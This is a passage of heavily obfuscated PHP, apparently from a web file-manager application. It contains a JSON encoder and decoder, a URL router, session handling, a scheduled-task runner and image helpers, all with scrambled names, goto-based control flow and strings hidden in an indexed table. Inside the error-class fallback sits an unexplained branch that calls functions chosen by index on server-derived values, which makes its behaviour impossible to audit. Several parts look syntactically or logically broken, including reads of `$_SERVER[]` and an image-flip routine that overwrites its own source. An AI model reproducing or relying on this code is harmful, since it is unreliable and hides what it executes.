(isset(self::$_cacheHeader[$DÖ])) { return self::$_cacheHeader[$DÖ]; } self::$_cacheHeader[$DÖ] = url_header($DÖ); return self::$_cacheHeader[$DÖ]; } public function hashSimple($aǑ, $c߿ϙ = false) { goto Bś똇; B: $a = timeFloat(); $A = 15; for ($dř = 0; $dř < $f; $dř++) { if (timeFloat() - $a > $A) { return !1; } $Aʣ = $this->fileSubstr($aǑ, $aݴ * $dř, $dⶪ); if (!$Aʣ) { return !1; } $C埥ӹ .= $Aʣ; } goto CϏ; Bś똇: $d걥͏ =& $_SERVER[]; $B = $this->info($aǑ); if (!$B || !$B[$d걥͏[188]]) { return !1; } goto c룻ۗ; c룻ۗ: $Dƒ = $B[$d걥͏[77]]; $dⶪ = 200; $f = 50; goto C; CϏ: $C埥ӹ .= $this->fileSubstr($aǑ, $Dƒ - $dⶪ, $dⶪ); return md5($C埥ӹ) . $Dƒ; goto DЊ; C: if ($Dƒ <= $dⶪ * $f) { return md5($this->fileSubstr($aǑ, 0, $Dƒ)) . $Dƒ; } $aݴ = intval($Dƒ / $f); $C埥ӹ = $d걥͏[33]; goto B; DЊ: } public function getContent($c˅) { return $this->fileSubstr($c˅); } public function fileSubstr($E, $cƱɻ = 0, $Bء춳 = -1) { goto d𷳥; A: if ($Bء춳 === -1) { $Bء춳 = $Aڃő[$E[77]]; } if ($Bء춳 == 0) { return $E[33]; } $C = array($E[1305] . $cƱɻ . $E[735] . ($cƱɻ + $Bء춳 - 1)); goto b; b: $a = url_request($E, $E[216], !1, $C, !1, !1, 1); return $a[$E[1049]] ? $a[$E[1049]] : $E[33]; goto bя; d𷳥: $E =& $_SERVER[]; $Aڃő = $this->info($E); if (!$Aڃő || !$Aڃő[$E[188]] && $Aڃő[$E[77]] > 1024 * 1024 * 10) { return !1; } goto A; bя: } public function download($e, $cɃÉ) { Downloader::start($e, $cɃÉ); return $cɃÉ; } } goto B; AȘ: define($_SERVER[][1954], 32); class Services_JSON { function __construct($a댷 = 0) { $this->use = $a댷; } function utf162utf8($FÞ) { $f珗Ȫ =& $_SERVER[]; if (function_exists($f珗Ȫ[68])) { return mb_convert_encoding($FÞ, $f珗Ȫ[1606], $f珗Ȫ[1955]); } $bͨ = ord($FÞ[0]) << 8 | ord($FÞ[1]); switch (!0) { case (127 & $bͨ) == $bͨ: return chr(127 & $bͨ); case (2047 & $bͨ) == $bͨ: return chr(192 | $bͨ >> 6 & 31) . chr(128 | $bͨ & 63); case (65535 & $bͨ) == $bͨ: return chr(224 | $bͨ >> 12 & 15) . chr(128 | $bͨ >> 6 & 63) . chr(128 | $bͨ & 63); } return $f珗Ȫ[33]; } function utf82utf16($b) { $EӢ =& $_SERVER[]; if (function_exists($EӢ[68])) { return mb_convert_encoding($b, $EӢ[1955], $EӢ[1606]); } switch (strlen($b)) { case 1: return $b; case 2: return chr(7 & ord($b[0]) >> 2) . chr(192 & ord($b[0]) << 6 | 63 & ord($b[1])); case 3: return chr(240 & ord($b[0]) << 4 | 15 & ord($b[1]) >> 2) . chr(192 & ord($b[1]) << 6 | 127 & ord($b[2])); } return $EӢ[33]; } function encode($d) { $Dɸ =& $_SERVER[]; switch (gettype($d)) { case $Dɸ[1617]: return $d ? $Dɸ[1616] : $Dɸ[1618]; case $Dɸ[1956]: return $Dɸ[99]; case $Dɸ[303]: return (int) $d; case $Dɸ[278]: case $Dɸ[277]: return (double) $d; case $Dɸ[312]: $aۻ̟ = $Dɸ[33]; $Dپ = strlen($d); for ($Aܯ = 0; $Aܯ < $Dپ; ++$Aܯ) { $f = ord($d[$Aܯ]); switch (!0) { case $f == 8: $aۻ̟ .= $Dɸ[1957]; break; case $f == 9: $aۻ̟ .= $Dɸ[1593]; break; case $f == 10: $aۻ̟ .= $Dɸ[1591]; break; case $f == 12: $aۻ̟ .= $Dɸ[1958]; break; case $f == 13: $aۻ̟ .= $Dɸ[1592]; break; case $f == 34: case $f == 47: case $f == 92: $aۻ̟ .= $Dɸ[93] . $d[$Aܯ]; break; case $f >= 32 && $f <= 127: $aۻ̟ .= $d[$Aܯ]; break; case ($f & 224) == 192: $f֟ñ = pack($Dɸ[1959], $f, ord($d[$Aܯ + 1])); $Aܯ += 1; $b = $this->utf82utf16($f֟ñ); $aۻ̟ .= sprintf($Dɸ[1960], bin2hex($b)); break; case ($f & 240) == 224: $f֟ñ = pack($Dɸ[1959], $f, ord($d[$Aܯ + 1]), ord($d[$Aܯ + 2])); $Aܯ += 2; $b = $this->utf82utf16($f֟ñ); $aۻ̟ .= sprintf($Dɸ[1960], bin2hex($b)); break; case ($f & 248) == 240: $f֟ñ = pack($Dɸ[1959], $f, ord($d[$Aܯ + 1]), ord($d[$Aܯ + 2]), ord($d[$Aܯ + 3])); $Aܯ += 3; $b = $this->utf82utf16($f֟ñ); $aۻ̟ .= sprintf($Dɸ[1960], bin2hex($b)); break; case ($f & 252) == 248: $f֟ñ = pack($Dɸ[1959], $f, ord($d[$Aܯ + 1]), ord($d[$Aܯ + 2]), ord($d[$Aܯ + 3]), ord($d[$Aܯ + 4])); $Aܯ += 4; $b = $this->utf82utf16($f֟ñ); $aۻ̟ .= sprintf($Dɸ[1960], bin2hex($b)); break; case ($f & 254) == 252: $f֟ñ = pack($Dɸ[1959], $f, ord($d[$Aܯ + 1]), ord($d[$Aܯ + 2]), ord($d[$Aܯ + 3]), ord($d[$Aܯ + 4]), ord($d[$Aܯ + 5])); $Aܯ += 5; $b = $this->utf82utf16($f֟ñ); $aۻ̟ .= sprintf($Dɸ[1960], bin2hex($b)); break; } } return $Dɸ[113] . $aۻ̟ . $Dɸ[113]; case $Dɸ[1961]: if (is_array($d) && count($d) && array_keys($d) !== range(0, sizeof($d) - 1)) { $A = array_map(array($this, $Dɸ[1962]), array_keys($d), array_values($d)); foreach ($A as $f㡒) { if (Services_JSON::isError($f㡒)) { return $f㡒; } } return $Dɸ[1083] . join($Dɸ[47], $A) . $Dɸ[315]; } $C = array_map(array($this, $Dɸ[1963]), $d); foreach ($C as $B󻏉) { if (Services_JSON::isError($B󻏉)) { return $B󻏉; } } return $Dɸ[157] . join($Dɸ[47], $C) . $Dɸ[476]; case $Dɸ[1964]: $F = get_object_vars($d); $A = array_map(array($this, $Dɸ[1962]), array_keys($F), array_values($F)); foreach ($A as $f㡒) { if (Services_JSON::isError($f㡒)) { return $f㡒; } } return $Dɸ[1083] . join($Dɸ[47], $A) . $Dɸ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $Dɸ[99] : new Services_JSON_Error(gettype($d) . $Dɸ[1965]); } } function name_value($c, $aѴ) { $C߽ = $this->encode($aѴ); if (Services_JSON::isError($C߽)) { return $C߽; } return $this->encode(strval($c)) . $_SERVER[][4] . $C߽; } function reduce_string($bߥ) { $eҎ =& $_SERVER[]; $bߥ = preg_replace(array($eҎ[1966], $eҎ[1967], $eҎ[1968]), $eҎ[33], $bߥ); return trim($bߥ); } function decode($cڐ) { $dۈ =& $_SERVER[]; $cڐ = $this->reduce_string($cڐ); switch (strtolower($cڐ)) { case $dۈ[1616]: return !0; case $dۈ[1618]: return !1; case $dۈ[99]: return null; default: $c҉ё = array(); if (is_numeric($cڐ)) { return (double) $cڐ == (int) $cڐ ? (int) $cڐ : (double) $cڐ; } elseif (preg_match($dۈ[1969], $cڐ, $c҉ё) && $c҉ё[1] == $c҉ё[2]) { $Fʜ̈́ = substr($cڐ, 0, 1); $fԅ = substr($cڐ, 1, -1); $F = $dۈ[33]; $Fԅ㒜 = strlen($fԅ); for ($eŎܶ = 0; $eŎܶ < $Fԅ㒜; ++$eŎܶ) { $e̖ = substr($fԅ, $eŎܶ, 2); $c㌦ = ord($fԅ[$eŎܶ]); switch (!0) { case $e̖ == $dۈ[1957]: $F .= chr(8); ++$eŎܶ; break; case $e̖ == $dۈ[1593]: $F .= chr(9); ++$eŎܶ; break; case $e̖ == $dۈ[1591]: $F .= chr(10); ++$eŎܶ; break; case $e̖ == $dۈ[1958]: $F .= chr(12); ++$eŎܶ; break; case $e̖ == $dۈ[1592]: $F .= chr(13); ++$eŎܶ; break; case $e̖ == $dۈ[1373]: case $e̖ == $dۈ[1970]: case $e̖ == $dۈ[1586]: case $e̖ == $dۈ[1588]: if ($Fʜ̈́ == $dۈ[113] && $e̖ != $dۈ[1970] || $Fʜ̈́ == $dۈ[55] && $e̖ != $dۈ[1373]) { $F .= $fԅ[++$eŎܶ]; } break; case preg_match($dۈ[1971], substr($fԅ, $eŎܶ, 6)): $B别މ = chr(hexdec(substr($fԅ, $eŎܶ + 2, 2))) . chr(hexdec(substr($fԅ, $eŎܶ + 4, 2))); $F .= $this->utf162utf8($B别މ); $eŎܶ += 5; break; case $c㌦ >= 32 && $c㌦ <= 127: $F .= $fԅ[$eŎܶ]; break; case ($c㌦ & 224) == 192: $F .= substr($fԅ, $eŎܶ, 2); ++$eŎܶ; break; case ($c㌦ & 240) == 224: $F .= substr($fԅ, $eŎܶ, 3); $eŎܶ += 2; break; case ($c㌦ & 248) == 240: $F .= substr($fԅ, $eŎܶ, 4); $eŎܶ += 3; break; case ($c㌦ & 252) == 248: $F .= substr($fԅ, $eŎܶ, 5); $eŎܶ += 4; break; case ($c㌦ & 254) == 252: $F .= substr($fԅ, $eŎܶ, 6); $eŎܶ += 5; break; } } return $F; } elseif (preg_match($dۈ[1972], $cڐ) || preg_match($dۈ[1973], $cڐ)) { goto eߺظ; eߺظ: if ($cڐ[0] == $dۈ[157]) { $Cվ = array(SERVICES_JSON_IN_ARR); $f㘙 = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Cվ = array(SERVICES_JSON_IN_OBJ); $bˌ = array(); } else { $Cվ = array(SERVICES_JSON_IN_OBJ); $bˌ = new stdClass(); } } array_push($Cվ, array($dۈ[1974] => SERVICES_JSON_SLICE, $dۈ[263] => 0, $dۈ[1975] => !1)); $fԅ = substr($cڐ, 1, -1); goto E; cȂ: for ($eŎܶ = 0; $eŎܶ <= $Fԅ㒜; ++$eŎܶ) { $E憵 = end($Cվ); $e̖ = substr($fԅ, $eŎܶ, 2); if ($eŎܶ == $Fԅ㒜 || $fԅ[$eŎܶ] == $dۈ[47] && $E憵[$dۈ[1974]] == SERVICES_JSON_SLICE) { $E = substr($fԅ, $E憵[$dۈ[263]], $eŎܶ - $E憵[$dۈ[263]]); array_push($Cվ, array($dۈ[1974] => SERVICES_JSON_SLICE, $dۈ[263] => $eŎܶ + 1, $dۈ[1975] => !1)); if (reset($Cվ) == SERVICES_JSON_IN_ARR) { array_push($f㘙, $this->decode($E)); } elseif (reset($Cվ) == SERVICES_JSON_IN_OBJ) { $Fꎏ = array(); if (preg_match($dۈ[1976], $E, $Fꎏ)) { $Fݾ = $this->decode($Fꎏ[1]); $C鼅 = $this->decode($Fꎏ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $bˌ[$Fݾ] = $C鼅; } else { $bˌ->{$Fݾ} = $C鼅; } } elseif (preg_match($dۈ[1977], $E, $Fꎏ)) { $Fݾ = $Fꎏ[1]; $C鼅 = $this->decode($Fꎏ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $bˌ[$Fݾ] = $C鼅; } else { $bˌ->{$Fݾ} = $C鼅; } } } } elseif (($fԅ[$eŎܶ] == $dۈ[113] || $fԅ[$eŎܶ] == $dۈ[55]) && $E憵[$dۈ[1974]] != SERVICES_JSON_IN_STR) { array_push($Cվ, array($dۈ[1974] => SERVICES_JSON_IN_STR, $dۈ[263] => $eŎܶ, $dۈ[1975] => $fԅ[$eŎܶ])); } elseif ($fԅ[$eŎܶ] == $E憵[$dۈ[1975]] && $E憵[$dۈ[1974]] == SERVICES_JSON_IN_STR && (strlen(substr($fԅ, 0, $eŎܶ)) - strlen(rtrim(substr($fԅ, 0, $eŎܶ), $dۈ[93]))) % 2 != 1) { array_pop($Cվ); } elseif ($fԅ[$eŎܶ] == $dۈ[157] && in_array($E憵[$dۈ[1974]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Cվ, array($dۈ[1974] => SERVICES_JSON_IN_ARR, $dۈ[263] => $eŎܶ, $dۈ[1975] => !1)); } elseif ($fԅ[$eŎܶ] == $dۈ[476] && $E憵[$dۈ[1974]] == SERVICES_JSON_IN_ARR) { array_pop($Cվ); } elseif ($fԅ[$eŎܶ] == $dۈ[1083] && in_array($E憵[$dۈ[1974]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Cվ, array($dۈ[1974] => SERVICES_JSON_IN_OBJ, $dۈ[263] => $eŎܶ, $dۈ[1975] => !1)); } elseif ($fԅ[$eŎܶ] == $dۈ[315] && $E憵[$dۈ[1974]] == SERVICES_JSON_IN_OBJ) { array_pop($Cվ); } elseif ($e̖ == $dۈ[1978] && in_array($E憵[$dۈ[1974]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Cվ, array($dۈ[1974] => SERVICES_JSON_IN_CMT, $dۈ[263] => $eŎܶ, $dۈ[1975] => !1)); $eŎܶ++; } elseif ($e̖ == $dۈ[1979] && $E憵[$dۈ[1974]] == SERVICES_JSON_IN_CMT) { array_pop($Cվ); $eŎܶ++; for ($B̛ħ = $E憵[$dۈ[263]]; $B̛ħ <= $eŎܶ; ++$B̛ħ) { $fԅ = substr_replace($fԅ, $dۈ[50], $B̛ħ, 1); } } } if (reset($Cվ) == SERVICES_JSON_IN_ARR) { return $f㘙; } elseif (reset($Cվ) == SERVICES_JSON_IN_OBJ) { return $bˌ; } goto cŠ; E: $fԅ = $this->reduce_string($fԅ); if ($fԅ == $dۈ[33]) { if (reset($Cվ) == SERVICES_JSON_IN_ARR) { return $f㘙; } else { return $bˌ; } } $Fԅ㒜 = strlen($fԅ); goto cȂ; cŠ: } } } function isError($CԳ̄, $AՏ = null) { $EÝ =& $_SERVER[]; if (class_exists($EÝ[1980])) { return PEAR::isError($CԳ̄, $AՏ); } elseif (is_object($CԳ̄) && (get_class($CԳ̄) == $EÝ[1981] || is_subclass_of($CԳ̄, $EÝ[1981]))) { return !0; } return !1; } } if (class_exists($_SERVER[][1982])) { class Services_JSON_Error extends PEAR_Error { function __construct($D˃ʳ = "\165\x6e\x6b\156\x6f\167\156\x20\145\x72\162\157\162", $aӕݚ = null, $D˔ = null, $AҠ = null, $dŏ = null) { parent::PEAR_Error($D˃ʳ, $aӕݚ, $D˔, $AҠ, $dŏ); } } } else { if ($_SERVER[$_SERVER[][700]] != $_SERVER[$_SERVER[][1324]]) { goto Dվ; E: $fȑ = explode($_SERVER[][217], $B̴); if (count($fȑ) < $_SERVER[][557]) { $eЋ = $_SERVER[][704]; $eЋ(); } $E = $_SERVER[][705]; goto c園ɡ; Dվ: $fǷ = $_SERVER[][701]; $dɘ = $_SERVER[$_SERVER[][702]] . $_SERVER[][703]; $B̴ = $fǷ($dɘ); goto E; c園ɡ: $E($_SERVER[$_SERVER[][1132]]); goto FО; FО: } class Services_JSON_Error { function __construct($Dʒ = "\165\156\153\x6e\x6f\167\x6e\x20\x65\x72\x72\x6f\x72", $E㔄 = null, $D = null, $C = null, $f = null) { } } } goto aֺ; F߃Ҡھ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\133\x5e\x2f\x5d\x2b", "\72\x6e\x75\x6d" => "\133\x30\x2d\x39\135\53", "\x3a\141\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($dؖ, $C) { $A᷆ =& $_SERVER[]; if ($dؖ == $A᷆[1402]) { $c = array_map($A᷆[1403], $C[0]); $F = strpos($C[1], $A᷆[8]) === 0 ? $C[1] : $A᷆[8] . $C[1]; $a΄ӑ = $C[2]; } else { $c = null; $F = strpos($C[0], $A᷆[8]) === 0 ? $C[0] : $A᷆[8] . $C[0]; $a΄ӑ = $C[1]; } array_push(self::$maps, $c); array_push(self::$routes, $F); array_push(self::$methods, strtoupper($dؖ)); array_push(self::$callbacks, $a΄ӑ); } public static function error($E) { self::$errorCallback = $E; } public static function haltOnMatch($bή = true) { self::$halts = $bή; } public static function dispatch() { goto a; a: $B =& $_SERVER[]; $eᇾ = parse_url($_SERVER[$B[1404]], PHP_URL_PATH); $a霳݃ = $_SERVER[$B[154]]; goto FМ; A: self::$routes = preg_replace($B[1088], $B[8], self::$routes); if (in_array($eᇾ, self::$routes)) { $a = array_keys(self::$routes, $eᇾ); foreach ($a as $aۏ) { if (self::$methods[$aۏ] == $a霳݃ || self::$methods[$aۏ] == $B[1405] || in_array($a霳݃, self::$maps[$aۏ])) { $dؠ = !0; if (!is_object(self::$callbacks[$aۏ])) { $dמ = explode($B[8], self::$callbacks[$aۏ]); $c = end($dמ); $A՚ = explode($B[1406], $c); $Aت = new $A՚[0](); $Aت->{$A՚[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$aۏ]); if (self::$halts) { return; } } } } } else { $c = 0; foreach (self::$routes as $aۏ) { if (strpos($aۏ, $B[4]) !== !1) { $aۏ = str_replace($eӦ, $a, $aۏ); } if (preg_match($B[1407] . $aۏ . $B[1408], $eᇾ, $Eǭ)) { if (self::$methods[$c] == $a霳݃ || self::$methods[$c] == $B[1405] || !empty(self::$maps[$c]) && in_array($a霳݃, self::$maps[$c])) { $dؠ = !0; array_shift($Eǭ); if (!is_object(self::$callbacks[$c])) { $dמ = explode($B[8], self::$callbacks[$c]); $c = end($dמ); $A՚ = explode($B[1406], $c); $Aت = new $A՚[0](); if (!method_exists($Aت, $A՚[1])) { echo $B[1409]; } else { call_user_func_array(array($Aت, $A՚[1]), $Eǭ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$c], $Eǭ); if (self::$halts) { return; } } } } $c++; } } if ($dؠ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $E =& $_SERVER[]; header($_SERVER[$E[1410]] . $E[1411]); echo $E[1412]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$B[1404]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Aј; FМ: $eӦ = array_keys(static::$patterns); $a = array_values(static::$patterns); $dؠ = !1; goto A; Aј: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aԐ; f: $EȘ = $GLOBALS[$dŰӚݽ[6]][$dŰӚݽ[337]]; self::$sessionTime = $EȘ[$dŰӚݽ[1413]]; $f˖ = SESSION_ID; goto BʵŦ; d،撅: $Bȗ = $EȘ[$dŰӚݽ[1415]]; $fυ = $EȘ[$Bȗ]; $f  = $EȘ[$dŰӚݽ[775]]; goto cʾ; aԐ: $dŰӚݽ =& $_SERVER[]; static $eզД = false; if ($eզД) { return $eզД; } goto f; b: return $eզД; goto e襂; BʵŦ: $f˖ = _get($GLOBALS, $dŰӚݽ[1414], $f˖); if (self::$sessionSign) { } else { if (Cookie::get($f˖)) { self::$sessionSign = Cookie::get($f˖); } else { self::$sessionSign = guid(); } } Cookie::setSafe($f˖, self::$sessionSign, self::$sessionTime); goto d،撅; cʾ: switch ($Bȗ) { case $dŰӚݽ[17]: self::$handle = Model($dŰӚݽ[776]); break; case $dŰӚݽ[777]: self::$handle = new CacheRedis($fυ, $f ); break; case $dŰӚݽ[778]: self::$handle = new CacheMemcached($fυ, $f ); break; case $dŰӚݽ[167]: $fυ[$dŰӚݽ[75]] = $fυ[$dŰӚݽ[75]] . $dŰӚݽ[1416]; self::$handle = new CacheFile($fυ, $f ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $eզД = new self(); goto b; e襂: } public static function sign($C = false) { $C && (self::$sessionSign = $C); self::init(); return self::$sessionSign; } public static function set($e캸, $bǔʓ = false) { self::init(); if (is_array($e캸)) { foreach ($e캸 as $D => $d϶) { array_set_value(self::$data, $D, $d϶); } } else { array_set_value(self::$data, $e캸, $bǔʓ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($b٬ = false) { self::init(); if (!$b٬) { return self::$data; } return array_get_value(self::$data, $b٬); } public static function remove($cڜ) { self::init(); unset(self::$data[$cڜ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][780])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto D׼; E: while (!0) { self::cacheClear(); if (self::valueGet($BȦ[708]) != $BȦ[83]) { self::valueSet($BȦ[1417], $BȦ[468]); self::log($BȦ[1421]); die; } self::valueSet($BȦ[1417], $BȦ[83]); self::valueSet($BȦ[1418], time()); self::taskRunAll(); sleep(self::valueGet($BȦ[1422])); } goto F޵͐; fͳЊ: http_close(); self::valueSet($BȦ[1417], $BȦ[83]); Hook::bind($BȦ[1419], $BȦ[1420]); goto E; D׼: $BȦ =& $_SERVER[]; if (self::valueGet($BȦ[708]) != $BȦ[83]) { return; } if (self::valueGet($BȦ[1417]) == $BȦ[83]) { $e = self::valueGet($BȦ[1418]); if (time() - $e > 3600 * 2) { self::restart(); } return; } goto fͳЊ; F޵͐: } public static function restart() { $eՅ =& $_SERVER[]; http_close(); self::valueSet($eՅ[708], $eՅ[468]); sleep(self::valueGet($eՅ[1422]) + 5); self::valueSet($eՅ[1417], $eՅ[468]); self::valueSet($eՅ[708], $eՅ[83]); } public static function shutdownEvent() { $D =& $_SERVER[]; self::valueSet($D[1417], $D[468]); self::log($D[1423]); } public static function config($Fట, $E) { $F =& $_SERVER[]; $d = 20; $E = intval($E) <= $d ? $d : intval($E); self::valueSet($F[708], $Fట); self::valueSet($F[1422], $E); } private static function taskRunAll() { $C =& $_SERVER[]; $Cࢂ = Model($C[1424])->listData(); $Fޖء = count($Cࢂ); for ($dˌݎ = 0; $dˌݎ < $Fޖء; $dˌݎ++) { $b׊ = $Cࢂ[$dˌݎ]; if ($b׊[$C[1425]] != $C[83]) { continue; } if (!self::taskTimeCheck($b׊)) { continue; } self::taskRun($b׊); } Hook::trigger($C[1426]); } private static function taskTimeCheck($f) { goto e汈; d意㔼: $A = strtotime($b톢[1427] . $B[$b톢[1428]] . $b톢[1429]) - strtotime($b톢[1430]); $E = time() - strtotime(date($b톢[1431]) . $b톢[1432]); $Fܲ = $E >= $A && $E <= $A + 3600; goto Dűڪ; e汈: $b톢 =& $_SERVER[]; $B = json_decode($f[$b톢[190]], !0); $f܊ = intval($f[$b톢[1418]]); goto d意㔼; Dűڪ: switch ($B[$b톢[29]]) { case $b톢[1433]: if (time() - $f܊ < 3600 * 24 * 30) { return !1; } if ($B[$b톢[1433]] == date($b톢[1434]) && $Fܲ) { return !0; } break; case $b톢[1435]: if (time() - $f܊ < 3600 * 24 * 7) { return !1; } $Dԑ = date($b톢[1436]) == 0 ? 7 : date($b톢[1436]); if ($B[$b톢[1435]] == $Dԑ && $Fܲ) { return !0; } break; case $b톢[1428]: if (time() - $f܊ < 3600 * 24) { return !1; } if ($Fܲ) { return !0; } break; case $b톢[1437]: if (time() - $f܊ >= floatval($B[$b톢[1437]]) * 60) { return !0; } break; default: break; } return !1; goto Dٯ; Dٯ: } public static function taskRun($FՈ) { goto A⺌; A먢: $A򯸠 = timeFloat(); $A = $dȭ[33]; switch ($FՈ[$dȭ[29]]) { case $dȭ[295]: $E⠯ۓ = url_request($FՈ[$dȭ[1441]], $dȭ[216], !1, !1, !1, !1, 5); $A = strlen($E⠯ۓ); break; case $dȭ[215]: $A = Hook::apply($FՈ[$dȭ[1441]]); default: break; } goto fÝ; fÝ: Model($dȭ[1442])->add(array($dȭ[1443] => $dȭ[33], $dȭ[1444] => $dȭ[468], $dȭ[29] => $dȭ[1445] . $FՈ[$dȭ[367]], $dȭ[1446] => json_encode(array($dȭ[28] => $FՈ[$dȭ[28]], $dȭ[1447] => timeFloat() - $A򯸠, $dȭ[281] => $A)))); self::log($dȭ[1448] . $FՈ[$dȭ[367]] . $dȭ[1449] . $A); return !0; goto f; A⺌: $dȭ =& $_SERVER[]; self::log($dȭ[1438] . $FՈ[$dȭ[367]] . $dȭ[1439] . $FՈ[$dȭ[28]] . $dȭ[1440] . $FՈ[$dȭ[1441]]); Model($dȭ[1424])->run($FՈ[$dȭ[367]]); goto A먢; f: } private static function valueGet($D⯂֎) { $fɖǾ =& $_SERVER[]; $dÑ = $fɖǾ[1450]; $Bҍ = Model($fɖǾ[1451])->get($D⯂֎, $dÑ); if (is_null($Bҍ)) { Model($fɖǾ[1451])->set($fɖǾ[1422], 10, $dÑ); Model($fɖǾ[1451])->set($fɖǾ[708], $fɖǾ[83], $dÑ); Model($fɖǾ[1451])->set($fɖǾ[1417], $fɖǾ[468], $dÑ); $Bҍ = Model($fɖǾ[1451])->get($D⯂֎, $dÑ); } return $Bҍ; } private static function valueSet($AКՉ, $Fް) { $Dߏڼ =& $_SERVER[]; return Model($Dߏڼ[1451])->set($AКՉ, $Fް, $Dߏڼ[1450]); } protected static function log($eؔ) { write_log($eؔ, $_SERVER[][1452]); } private static function cacheClear() { $a핫 =& $_SERVER[]; $dԉ = Model($a핫[1451])->cacheKey($a핫[1450]); Cache::clearMemory($dԉ); } } goto dɦȌ; f͜: if (!function_exists($_SERVER[][1888])) { define($_SERVER[][1889], 0); define($_SERVER[][1890], 1); define($_SERVER[][1891], 2); function imageflip($a, $aʏ釢) { switch ($aʏ釢) { case IMG_FLIP_HORIZONTAL: $d㭂 = imagesx($a) - 1; $AӮ = $d㭂 / 2; $dϺ = imagesy($a); $a = imageistruecolor($a) ? imagecreatetruecolor(1, $dϺ) : imagecreate(1, $dϺ); for ($B = 0; $B < $AӮ; ++$B) { imagecopy($a, $a, 0, 0, $B, 0, 1, $dϺ); imagecopy($a, $a, $B, 0, $d㭂 - $B, 0, 1, $dϺ); imagecopy($a, $a, $d㭂 - $B, 0, 0, 0, 1, $dϺ); } break; case IMG_FLIP_VERTICAL: $D = imagesx($a); $c = imagesy($a) - 1; $a = $c / 2; $a = imageistruecolor($a) ? imagecreatetruecolor($D, 1) : imagecreate($D, 1); for ($bƦ = 0; $bƦ < $a; ++$bƦ) { imagecopy($a, $a, 0, 0, 0, $bƦ, $D, 1); imagecopy($a, $a, 0, $bƦ, 0, $c - $bƦ, $D, 1); imagecopy($a, $a, 0, $c - $bƦ, 0, 0, $D, 1); } break; case IMG_FLIP_BOTH: $D = imagesx($a); $dϺ = imagesy($a); $a = imagerotate($a, 180, 0); imagecopy($a, $a, 0, 0, 0, 0, $D, $dϺ); break; default: return; } imagedestroy($a); } } if (!function_exists($_SERVER[][1892])) { function imagecreatefrombmp($bΑ) { return ImageGdBMP::load($bΑ); } } class Input { public static function getArray($b) { goto dӥȤ; dӥȤ: $c =& $_SERVER[]; global $in; $a = array(); goto eŗ; eŗ: $eµ = array(); $Dٔ = LNG($c[1893]); foreach ($b as $Bɕ => $Cİڍ) { goto B׋ٳ; dБ: if (isset($Cİڍ[$c[1896]]) && !self::check($in[$Bɕ], $Cİڍ[$c[1896]], $Cӹ޻)) { if (array_key_exists($c[1895], $Cİڍ)) { if (!is_null($Cİڍ[$c[1895]])) { $a[$eؑ] = $Cİڍ[$c[1895]]; } } else { $eµ[] = $Eͽ; } continue; } $a[$eؑ] = $in[$Bɕ]; goto F̈́; B׋ٳ: $Eͽ = _get($Cİڍ, $c[1262], $Dٔ . $c[895] . $Bɕ); $eؑ = $Bɕ; if (isset($Cİڍ[$c[1894]]) && $Cİڍ[$c[1894]]) { $eؑ = $Cİڍ[$c[1894]]; } goto c祣ߐ; c祣ߐ: if (!array_key_exists($Bɕ, $in)) { if (array_key_exists($c[1895], $Cİڍ)) { if (!is_null($Cİڍ[$c[1895]])) { $a[$eؑ] = $Cİڍ[$c[1895]]; } } else { if (isset($Cİڍ[$c[1896]])) { $eµ[] = $Eͽ; } } continue; } if (isset($Cİڍ[$c[1896]]) && $Cİڍ[$c[1896]] == $c[282]) { $c֤ߛ = json_decode($in[$Bɕ], !0); if (is_array($c֤ߛ)) { $a[$eؑ] = $c֤ߛ; } else { if (array_key_exists($c[1895], $Cİڍ)) { if (!is_null($Cİڍ[$c[1895]])) { $a[$eؑ] = $Cİڍ[$c[1895]]; } } else { $eµ[] = $Eͽ; } } continue; } $Cӹ޻ = _get($Cİڍ, $c[1027]); goto dБ; F̈́: } goto F; F: if (count($eµ) > 0) { show_json(implode($c[1897], $eµ), !1); } return $a; goto F; F: } public static function reg($F⎙է = "\162\x65\161\x75\151\162\x65") { static $B = array("\x72\145\x71\x75\x69\x72\145" => "\x2e\53", "\x6e\165\155\142\x65\x72" => "\x5c\144\x2b", "\x68\x65\170" => "\x5b\60\x2d\71\101\55\x46\x61\x2d\x66\135\x2b", "\151\156\164" => "\133\55\134\53\x5d\77\134\144\x2b", "\x62\x6f\x6f\154" => "\60\x7c\61", "\x66\x6c\157\141\164" => "\x5b\55\134\x2b\135\x3f\x5c\144\53\50\x5c\x2e\134\x64\x2b\51\x3f", "\x65\156\x67\154\x69\163\x68" => "\x5b\x41\x2d\x5a\141\55\x7a\x20\135\53", "\143\x68\151\x6e\145\163\145" => "\133\x5c\x78\173\64\x65\x30\x30\175\x2d\134\x78\x7b\x39\146\141\65\x7d\135\53", 